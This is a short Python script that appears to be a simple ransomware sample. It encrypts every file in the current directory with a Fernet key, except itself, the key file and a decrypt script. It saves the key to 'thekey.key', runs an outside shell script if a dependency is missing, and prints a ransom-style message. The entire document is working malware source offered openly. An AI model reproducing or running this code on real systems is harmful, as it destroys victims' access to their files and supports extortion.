#!/usr/bin/env python3

import os
import subprocess
import pkgutil

if pkgutil.find_loader("cryptography"):
	pass
else:
        subprocess.call(['sh','./shell.sh'])

from cryptography.fernet import Fernet


files = []

for file in os.listdir():
	if file == "voldemort.py" or file=="thekey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)

key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
	thekey.write(key)

for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)

print()
print("All your files in this diro are encrypted!!")
